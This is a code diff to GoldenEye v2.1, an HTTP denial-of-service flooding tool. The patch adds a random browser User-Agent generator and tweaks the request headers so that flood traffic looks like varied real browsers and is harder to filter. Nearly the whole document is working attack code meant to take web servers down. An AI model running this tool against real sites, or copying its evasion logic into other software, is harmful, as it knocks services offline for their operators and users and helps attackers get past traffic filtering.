@@ -73,6 +73,42 @@ DEFAULT_SOCKETS=500
 
 GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
 
+USER_AGENT_PARTS = {
+    'os': {
+        'linux': {
+            'name': [ 'Linux x86_64', 'Linux i386' ],
+            'ext': [ 'X11' ]
+        },
+        'windows': {
+            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
+            'ext': [ 'WOW64', 'Win64; x64' ]
+        },
+        'mac': {
+            'name': [ 'Macintosh' ],
+            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
+        },
+    },
+    'platform': {
+        'webkit': {
+            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
+            'details': [ 'KHTML, like Gecko' ],
+            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
+        },
+        'iexplorer': {
+            'browser_info': {
+                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
+                'ext_pre': [ 'compatible', 'Windows; U' ],
+                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
+            }
+        },
+        'gecko': {
+            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
+            'details': [],
+            'extensions': []
+        }
+    }
+}
+
 ####
 # GoldenEye Class
 ####
@@ -370,22 +406,72 @@ class Laser(Process):
 
         return self.url + param_joiner + self.generateQueryString(random.randint(1,5))
 
+    def getUserAgent(self):
+
+        if self.useragents:
+            return random.choice(self.useragents)
+
+        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
+
+        ## Mozilla Version
+        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6
+
+        ## System And Browser Information
+        # Choose random OS
+        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
+        os_name = random.choice(os['name']) 
+        sysinfo = os_name
+
+        # Choose random platform
+        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
+
+        # Get Browser Information if available
+        if 'browser_info' in platform and platform['browser_info']:
+            browser = platform['browser_info']
+
+            browser_string = random.choice(browser['name'])
+
+            if 'ext_pre' in browser:
+                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
+
+            sysinfo = "%s; %s" % (browser_string, sysinfo)
+
+            if 'ext_post' in browser:
+                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
+
+
+        if 'ext' in os and os['ext']:
+            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
+
+        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
+
+        if 'name' in platform and platform['name']:
+            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
+
+        if 'details' in platform and platform['details']:
+            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
+
+        if 'extensions' in platform and platform['extensions']:
+            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
+
+        return ua_string
+
     def generateRandomHeaders(self):
 
         # Random no-cache entries
         noCacheDirectives = ['no-cache', 'max-age=0']
         random.shuffle(noCacheDirectives)
-        nrNoCache = random.randint(0, (len(noCacheDirectives)-1))
+        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
         noCache = ', '.join(noCacheDirectives[:nrNoCache])
 
         # Random accept encoding
         acceptEncoding = ['\'\'','*','identity','gzip','deflate']
         random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(0,len(acceptEncoding)/2)
+        nrEncodings = random.randint(1,len(acceptEncoding)/2)
         roundEncodings = acceptEncoding[:nrEncodings]
 
         http_headers = {
-            'User-Agent': random.choice(self.useragents),
+            'User-Agent': self.getUserAgent(),
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
@@ -461,7 +547,7 @@ def usage():
     print
     print ' OPTIONS:'
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: random from res/lists/useragents)'
+    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
     print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
     print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
     print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
@@ -531,15 +617,12 @@ def main():
                 error("option '"+o+"' doesn't exists")
 
 
-        if uas_file is None:
-            uas_file = random.choice(os.listdir('res/lists/useragents'))
-            uas_file = 'res/lists/useragents/'+uas_file
-
-        try:
-            with open(uas_file) as f:
-                useragents = f.readlines()
-        except EnvironmentError:
-                error("cannot read file {0}".format(uas_file))
+        if uas_file:
+            try:
+                with open(uas_file) as f:
+                    useragents = f.readlines()
+            except EnvironmentError:
+                    error("cannot read file {0}".format(uas_file))
 
         goldeneye = GoldenEye(url)
         goldeneye.useragents = useragents
